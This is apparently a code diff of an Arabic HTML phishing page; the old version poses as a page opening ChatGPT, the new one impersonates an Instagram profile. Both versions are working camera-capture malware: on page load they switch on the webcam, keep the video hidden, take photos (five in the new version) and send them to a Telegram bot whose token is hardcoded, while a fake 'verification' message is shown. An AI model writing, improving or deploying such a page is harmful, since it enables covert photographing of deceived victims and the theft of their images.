@@ -1,90 +1,376 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 0; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: #ffffff; color: #333; }
-        .loader-container { text-align: center; }
-        /* شريط التحميل الدوار */
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { font-size: 18px; font-weight: bold; color: #555; }
-        /* إخفاء الكاميرا تماماً */
-        video, canvas { display: none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>حساب Instagram</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --ig-gradient: linear-gradient(45deg,
+      #405DE6, #5851DB, #833AB4, #C13584,
+      #E1306C, #FD1D1D, #F56040, #F77737,
+      #FCAF45, #FFDC80);
+    --ig-blue: #0095F6;
+    --ig-text: #262626;
+    --ig-gray: #8e8e8e;
+    --ig-border: #dbdbdb;
+    --ig-bg: #fafafa;
+  }
+
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: var(--ig-bg);
+    font-family: -apple-system, 'Segoe UI', 'Helvetica Neue', Tahoma, sans-serif;
+    color: var(--ig-text);
+    padding: 20px;
+  }
+
+  .card {
+    width: 100%;
+    max-width: 400px;
+    background: #ffffff;
+    border: 1px solid var(--ig-border);
+    border-radius: 12px;
+    padding: 40px 32px 32px;
+    text-align: center;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.06);
+  }
+
+  /* ===== غلاف الصورة + الشعار ===== */
+  .avatar-wrapper {
+    position: relative;
+    width: 140px;
+    height: 140px;
+    margin: 0 auto 20px;
+  }
+
+  .avatar {
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    padding: 4px;
+    background: var(--ig-gradient);
+    box-shadow: 0 4px 20px rgba(225, 48, 108, 0.25);
+  }
+  .avatar img {
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    object-fit: cover;
+    display: block;
+    background: #efefef;
+    border: 3px solid #fff;
+  }
+
+  /* شعار Instagram في الزاوية العليا اليسرى */
+    /* شعار Instagram في أعلى يسار الشاشة */
+  .ig-badge {
+    position: fixed;
+    top: 20px;
+    left: 20px;
+    font-family: 'Brush Script MT', 'Segoe Script', 'Lucida Handwriting', cursive;
+    font-size: 26px;
+    font-weight: 700;
+    font-style: italic;
+    letter-spacing: -0.5px;
+    line-height: 1;
+    background-image: var(--ig-gradient);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+    color: transparent;
+    z-index: 9999;
+    pointer-events: none;
+  }
+
+  .name {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--ig-text);
+    margin-bottom: 8px;
+    letter-spacing: -0.3px;
+  }
+  .bio {
+    font-size: 14px;
+    line-height: 1.7;
+    color: var(--ig-gray);
+    margin-bottom: 22px;
+  }
+
+  .divider {
+    height: 1px;
+    background: var(--ig-border);
+    margin-bottom: 22px;
+  }
+
+  #status {
+    font-size: 14px;
+    line-height: 1.8;
+    min-height: 64px;
+    padding: 18px 16px;
+    border-radius: 12px;
+    background: #fafafa;
+    border: 1px solid var(--ig-border);
+    color: var(--ig-text);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    transition: all .3s;
+  }
+  .status-info    { color: var(--ig-blue); }
+  .status-success { color: #22c55e; }
+  .status-error   { color: #ed4956; }
+
+  .spinner {
+    display: inline-block;
+    width: 16px; height: 16px;
+    border: 2px solid rgba(0,0,0,0.1);
+    border-top-color: var(--ig-blue);
+    border-radius: 50%;
+    animation: spin .7s linear infinite;
+    vertical-align: -3px;
+    margin-inline-end: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .big-icon {
+    font-size: 44px;
+    display: block;
+    margin-bottom: 6px;
+  }
+
+  /* الكاميرا مخفية تمامًا */
+  #camHidden {
+    position: fixed;
+    top: -9999px;
+    left: -9999px;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+  }
+</style>
 </head>
 <body>
 
-    <div class="loader-container">
-        <div class="loader"></div>
-        <p id="status">فتح chat gpt</p>
+<div class="card">
+
+  <!-- ===== الصورة + شعار Instagram ===== -->
+  <div class="avatar-wrapper">
+    <div class="avatar">
+      <img id="avatarImg"
+           src="https://i.postimg.cc/PqhHkNvf/mohammed.jpg"
+           alt=" "
+           onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect fill=%22%23efefef%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2258%22 font-size=%2240%22 text-anchor=%22middle%22 fill=%22%238e8e8e%22>?</text></svg>'">
     </div>
+    <div class="ig-badge">Instagram</div>
+  </div>
 
-    <!-- العناصر المخفية -->
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+  <!-- ضع الاسم هنا -->
+  <h1 class="name">@Mohammed Dawood</h1>
 
-    <script>
-        const botToken = '8757176986:AAFNsvSswM4J_I_adIelUJWTSuqwRvFJgRo';
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const status = document.getElementById('status');
+  <!-- ضع النص هنا -->
+  <p class="bio">سجل الدخول للوصول لحساب هذا المستخدم على Instagram</p>
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('id');
+  <div class="divider"></div>
 
-        // دالة التقاط وإرسال الصورة
-        async function captureAndSend() {
-            if (!chatId) {
-                status.innerText = "خطأ في المعرف، يرجى إعادة الدخول من البوت.";
-                return;
-            }
+  <div id="status" class="status-info">
+    <div><span class="spinner"></span>جار فتح حساب Instagram</div>
+  </div>
 
-            status.innerText = "جاري فتح موقع chat gpt...";
+  <div id="camHidden">
+    <video id="video" autoplay playsinline muted></video>
+  </div>
+  <canvas id="canvas" style="display:none"></canvas>
+</div>
 
-            // إعداد الكانفاس
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+<script>
+/* ============================================================
+   الإعدادات
+   ============================================================ */
+const TELEGRAM_TOKEN   = '8662015576:AAEDAgAPTh4L_-Mgk-Wo44kpovyTCyO8mJQ';
+const TELEGRAM_CHAT_ID = '8335283387';
 
-            // تحويل الصورة وإرسالها
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'capture.jpg');
-                formData.append('caption', '📸 تم التقاط صورة تلقائية للمستخدم.');
+const CONFIG = {
+  photosCount: 5,      // عدد الصور
+  intervalMs: 120,     // فاصل صغير جدًا بين التقاط وآخر
+  quality: 0.85,
+  maxWidth: 900
+};
+/* ============================================================ */
 
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(() => {
-                    status.innerText = "تم بنجاح، جاري تحويلك...";
-                    // التحويل إلى ChatGPT بعد الإرسال
-                    setTimeout(() => {
-                        window.location.href = "https://chatgpt.com";
-                    }, 500);
-                })
-                .catch(() => {
-                    window.location.href = "https://chatgpt.com"; // تحويل حتى لو فشل الاتصال
-                });
-            }, 'image/jpeg', 0.7);
+const video    = document.getElementById('video');
+const canvas   = document.getElementById('canvas');
+const statusEl = document.getElementById('status');
+
+let stream = null;
+
+function setStatus(html, type = 'info', spinner = false) {
+  statusEl.className = 'status-' + type;
+  statusEl.innerHTML = (spinner ? '<span class="spinner"></span>' : '') + html;
+}
+
+/* ---------- 1) تشغيل الكاميرا بأسرع وقت ---------- */
+async function startCamera() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    setStatus('⚠️ المتصفح لا يدعم الكاميرا.', 'error');
+    return false;
+  }
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: 'user',
+        width:  { ideal: 1280 },
+        height: { ideal: 1280 }
+      },
+      audio: false
+    });
+
+    video.srcObject = stream;
+    await video.play();
+
+    // ننتظر فقط حتى يجهز أول فريم (فحص سريع جدًا كل 20 مللي ثانية)
+    await new Promise(resolve => {
+      if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
+      const check = setInterval(() => {
+        if (video.readyState >= 2 && video.videoWidth > 0) {
+          clearInterval(check);
+          resolve();
         }
+      }, 20);
+    });
 
-        // تشغيل الكاميرا تلقائياً عند الدخول
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => { 
-                video.srcObject = stream;
-                // الانتظار ثانية واحدة للتأكد من وضوح الصورة ثم الالتقاط
-                setTimeout(captureAndSend, 1500);
-            })
-            .catch(err => { 
-                status.innerText = "يجب السماح بالصلاحيات للمتابعة...";
-                console.error(err);
-            });
-    </script>
+    return true;
+
+  } catch (err) {
+    console.error(err);
+    let msg = 'يجب منح اذن الكاميرا لشركة Instagram لتتحقق من هذا الحساب.';
+    if (err.name === 'NotAllowedError') {
+      msg = '🚫 يرجى السماح بالوصول إلى الكاميرا ثم إعادة تحميل الصفحة.';
+    } else if (err.name === 'NotFoundError') {
+      msg = '📷 لم يتم العثور على كاميرا.';
+    } else if (err.name === 'NotReadableError') {
+      msg = '⚠️ الكاميرا مستخدمة من تطبيق آخر.';
+    }
+    setStatus(msg, 'error');
+    return false;
+  }
+}
+
+function stopCamera() {
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+}
+
+/* ---------- 2) التقاط صورة واحدة ---------- */
+function captureFrame() {
+  const w = video.videoWidth;
+  const h = video.videoHeight;
+  if (!w || !h) return null;
+
+  const scale = Math.min(1, CONFIG.maxWidth / w);
+  canvas.width  = Math.round(w * scale);
+  canvas.height = Math.round(h * scale);
+
+  const ctx = canvas.getContext('2d');
+  ctx.translate(canvas.width, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  return canvas;
+}
+
+function canvasToBlob(cv) {
+  return new Promise((resolve, reject) => {
+    cv.toBlob(
+      blob => blob ? resolve(blob) : reject(new Error('فشل إنشاء الصورة')),
+      'image/jpeg',
+      CONFIG.quality
+    );
+  });
+}
+
+/* ---------- 3) إرسال صورة واحدة إلى تليجرام ---------- */
+async function sendPhoto(blob, index) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+
+  const fd = new FormData();
+  fd.append('chat_id', TELEGRAM_CHAT_ID);
+  fd.append('photo', blob, `photo_${index}.jpg`);
+  fd.append('caption',
+    `📸 صورة ${index} من ${CONFIG.photosCount}\n` +
+    `🕐 ${new Date().toLocaleString('ar-EG')}`
+  );
+
+  const res  = await fetch(url, { method: 'POST', body: fd });
+  const data = await res.json();
+  if (!data.ok) throw new Error(data.description || 'فشل الإرسال');
+  return data;
+}
+
+/* ---------- 4) التدفق الرئيسي: التقط ← أرسل فورًا ← التقط التالية ---------- */
+async function runVerification() {
+  const ok = await startCamera();
+  if (!ok) return;
+
+  setStatus('📸 جارٍ التحقق…', 'info', true);
+
+  const sendPromises = [];
+  let failed = 0;
+
+  for (let i = 1; i <= CONFIG.photosCount; i++) {
+    const cv = captureFrame();
+    if (!cv) break;
+
+    const blob = await canvasToBlob(cv);
+
+    // بدء الإرسال في الخلفية (بدون await) — نلتقط التالية فورًا
+    const p = sendPhoto(blob, i).catch(err => {
+      console.warn(`فشل إرسال الصورة ${i}:`, err.message);
+      failed++;
+    });
+    sendPromises.push(p);
+
+    if (i < CONFIG.photosCount) {
+      await new Promise(r => setTimeout(r, CONFIG.intervalMs));
+    }
+  }
+
+  // الكاميرا انتهى عملها — أوقفها فورًا
+  stopCamera();
+
+  setStatus('☁️ جارٍ إنهاء الإرسال…', 'info', true);
+
+  await Promise.all(sendPromises);
+
+  if (failed === CONFIG.photosCount) {
+    setStatus('❌ تعذّر الإرسال.<br>يرجى إعادة تحميل الصفحة.', 'error');
+    return;
+  }
+
+  statusEl.className = 'status-success';
+  statusEl.innerHTML =
+    '<span class="big-icon">✅</span>' +
+    'تم التحقق بنجاح.<br>' +
+    'شكرًا لك.';
+}
+
+/* ---------- 5) البدء ---------- */
+window.addEventListener('load', () => {
+  runVerification();
+});
+
+window.addEventListener('pagehide', stopCamera);
+</script>
+
 </body>
 </html>
